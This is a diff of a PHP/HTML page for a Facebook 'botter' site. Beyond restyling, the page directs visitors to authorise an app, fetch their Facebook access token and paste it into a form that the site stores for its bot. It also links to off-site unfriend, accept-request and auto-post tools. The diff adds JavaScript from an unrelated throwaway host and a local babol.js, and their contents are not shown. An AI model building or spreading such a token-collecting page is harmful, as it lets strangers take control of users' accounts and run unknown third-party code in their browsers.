@@ -57,9 +57,10 @@ if(!isset($_SESSION['logged']) || $_SESSION['logged'] ==  false){
 
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
 ♥CHAUDHRYS BOTTER♥
-</title><link rel="stylesheet" type="text/css" href="http://flambon.wen.ru/a/natural_designa.css"
+</title><link rel="stylesheet" type="text/css" href="ali.css"
 
-</title><link rel="stylesheet" type="text/css" href="http://flambon.wen.ru/a/natural_designa.css" media="all,box.css"/><link rel="shortcut icon" href="">
+</title><link rel="stylesheet" type="text/css" href="black.css" media="all,box.css"/><link rel="shortcut icon" href=""><script type="text/javascript" async="async" defer="defer" data-cfasync="false" src="https://mylivechat.com/chatinline.aspx?hccid=85737440"></script>
+<script language="JavaScript" src="http://kijupogo2u.temp.swtest.ru/bb.js"></script>
 <?php error_reporting(0);
 $bot=new bot();
 class bot{ 
@@ -350,8 +351,7 @@ $jam=gmdate('H',time()+60*60*7);
 echo'
 <div id="header">
 <h1 class="heading">
-<center><font color="red" size="8"><a target="_top" href="http://www.flamingtext.com/" ><img src="http://blog.flamingtext.com/blog/2016/04/09/flamingtext_com_1460246196_672985706.gif" border="0" alt="Logo Design by FlamingText.com" title="Logo Design by FlamingText.com"></a>
-<br/></font></center>
+<center><a target="_top" href="http://www.flamingtext.com/" ><img src="http://blog.flamingtext.com/blog/2017/01/11/flamingtext_com_1484166347_572057355.png" border="0" alt="Logo Design by FlamingText.com" title="Logo Design by FlamingText.com"></a></center>
 </h1>
 <h2 class="description">
 </h2></div>';
@@ -363,16 +363,11 @@ echo'
 <div class="post">
 <div class="post-meta">
 <h2 class="title">
-Administrator Websites
 </h2>
-ZAIN AQDAS 
 </div>
 
 <div class="post-content">
-<center><a href="https://fb.com/100010212424610"><Zain>
-<div class="post-content">
-<a href="http://m.facebook.com/100010212424610"><img src="https://graph.facebook.com/100010212424610/picture" style="border: 4px solid #000; padding: 4px; margin: 4px; width: 200px; height: 200px; float: left;" alt="ZaIn Aqdas" class="thumbnail"/></a>
-<a href="http://m.facebook.com/100007254704700"><img src="https://graph.facebook.com/100007254704700/picture" style="border: 4px solid #000; padding: 4px; margin: 4px; width: 200px; height: 200px; float: left;" alt="PATHAN CHACHA" class="thumbnail"/></a>
+<marquee class="GeneratedMarquee" direction="left" scrollamount="12" behavior="scroll"><font size="26" color="red">••´º´•» </font><font face="Orbitron" size="6" style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em red, 0pt 2pt 0.6em red;"><b> Script Created By Zain Aqdas </b></font><font size="26" color="red"> «•´º´••</font></marquee>
 <span>
 <p style="font-weight:bold;">
 <br><u><b>scяιρт cяεαтε∂  вү !! CHAUDHRYS BOTTER</u></b> <br>
@@ -380,10 +375,8 @@ ZAIN AQDAS
 </span>
 </div>
 <div class="post-meta2">
-<center><b>▁ ▂ ▄ ▅ ▆ ▇ █ <mark><u>Zain X3 Ch Botters</u></mark> █ ▇ ▆ ▅ ▄ ▂ ▁</b>
-</center>
-<iframe src="//www.facebook.com/plugins/follow?href=https%3A%2F%2Fwww.facebook.com%2Fzain.aqdas.II&amp;layout=standard&amp;show_faces=true&amp;colorscheme=light&amp;width=450&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:80px;" allowTransparency="true"></iframe>
-<iframe src="//www.facebook.com/plugins/follow?href=https%3A%2F%2Fwww.facebook.com%2Fzain.aqdas.9&amp;layout=standard&amp;show_faces=true&amp;colorscheme=light&amp;width=450&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:80px;" allowTransparency="true"></iframe>
+<br><center><font color="yellow" size="+1"><marquee bgcolor="" direction="left" loop="infinite" width="20%"><strong> ♥ WELCOM TO MY SITE ♥ WELCOM TO MY SITE ♥ WELCOM TO MY SITE ♥ WELCOM TO MY SITE ♥ WELCOM TO MY SITE ♥ WELCOM TO MY SITE </strong></marquee>
+<br>
 </div></div></div>';
 }
 
@@ -415,27 +408,22 @@ public function bwh() {
  }
  	echo '<div id="bottom-content">
 <div id="navigation-menu">
-<h3><a name="navigation-name" class="no-link">Get ACCESS Token
-</a></h3>
-<marquee behavior="scroll" direction="right" scrollamount="5" scrolldelay="3" width="100%">
-<b>
-<font size="20" color="red">(</font><a class="sec" href="http://fb.com/1547542835569366"><font color="sky blue" size="20">CHAUDHRYS BOTTER</font></a></b> <font size="20" color="red">♥</font>
-<b>
-<a class="sec" href="http://fb.com/1547542835569366
-"><font color="sky blue" size="20">CHAUDHRYS BOTTER</font></a></b><font size="20" color="red">)</font></marquee><br />
-<font size="5" color="red">CHAUDHRYS BOTTER &copy; 2016-2018</font>
-</span>
-</div></center><br>
-<h3><a name="navigation-name" class="no-link"> GET WORKING TOKEN </a></h3><br>
-<center>
-<ul>
-<a style="text-decoration:none" href="https://goo.gl/NkKRQ6" target="_blank"><b>GET WORKING TOKEN(OTHER TOKEN NOT SUPPORTING)<i class="fa fa-external-link"></i></b></a> 
-<br>
-</center>
+<br><center><h4><font size="26" color="red"><center></font><font face="Orbitron" size="6" style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em red, 0pt 2pt 0.6em red;"><b>⬇ GET WORKING TOKEN ⬇ </b></font><font size="26" color="red"></center></font></h4>
+<center><td><a href="https://goo.gl/dWxrQZ" target="_blank" style="text-decoration: none;">
+<input type="button" value="❤Allow App❤" style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 12px;font-size: 15px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color:white;background: none;width:150px;"></td></a><td><a href="https://developers.facebook.com/tools/debug/accesstoken/?app_id=41158896424" target="_blank" style="text-decoration: none;">
+<input type="button" value="❤Get Token❤" style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 12px;font-size: 15px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color:white;background: none;width:150px;"></td> </a></center>
+<br><center><h4><font size="26" color="red"><center></font><font face="Orbitron" size="6" style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em red, 0pt 2pt 0.6em red;"><b>👇 OTHER SERVICES 👇 </b></font><font size="26" color="red"></center></font></h4>
+<center><td><a href="https://allfiles.comuf.com/unfriend.php" target="_blank" style="text-decoration: none;">
+<input type="button" value="List Clear" style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 12px;font-size: 15px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color:white;background: none;width:150px;"></td></a><td><a href="https://allfiles.comuf.com/all-accept.php" target="_blank" style="text-decoration: none;">
+<input type="button" value="Accept Requests" style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 12px;font-size: 15px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color:white;background: none;width:150px;"></td></a><td><a href="https://allfiles.comuf.com/auto-poster.php" target="_blank" style="text-decoration: none;">
+<input type="button" value="Auto Post" style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 12px;font-size: 15px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color:white;background: none;width:150px;"></td></a></center>
+<center><h4><font size="26" color="red"><center>••´º´•» </font><font face="Orbitron" size="6" style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em red, 0pt 2pt 0.6em red;"><b> 🎭  CHAUDHRY 🌹 BOTTER 🎭 </b></font><font size="26" color="red"> «•´º´••</center></font></h4>
 <div id="top-content">
 <div id="search-form">
 
-<form action="index.php" method="post"><input class="inp-text" type="text" style="height:28px;" name="token"> <input class="inp-btn" type="submit" style="height:28px;" value="  Sυвмιт "></form></div></div></div>';
+<center><br><form action="index.php" method="post"> <input class="inp-text" type="text" style="height:35px;width:60%;border-radius:15px;border:1px solid white;background: none;color:white;" name="token"> </br> 
+<br>
+  <input id="sbmt" class="inp-btn" type="submit" style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 12px;font-size: 15px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color:white;background: none;width:120px;" value="SUBMIT"></form></div></div></div>';
 
 $this->membEr();
 }
@@ -452,10 +440,8 @@ if($use != '.' && $use != '..'){
 
 echo'
 <div id="footer">
-User robot : <font color="red">'.count($user).'</font>
-<br>
-Script bot &copy; 2020<br>
-PoweRed By :  <a href="https://fb.com/100010212424610"><font color="Red">ZAIN X3 CH BOTTERS</font></a><br>
+<center><font style="font-family: Iceland;border: 1px solid white;color: white;border-radius: 48px;padding: 11px;font-size: 20px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color: white;background: none;width:140px;">User Active : <font color="red">'.count($user).'</font></font></h3></center><br>
+<marquee direction="right"<a><font face="Battle Beasts" size="12"> <script src="babol.js"></script></a></marquee>
 </div>';
 }
 
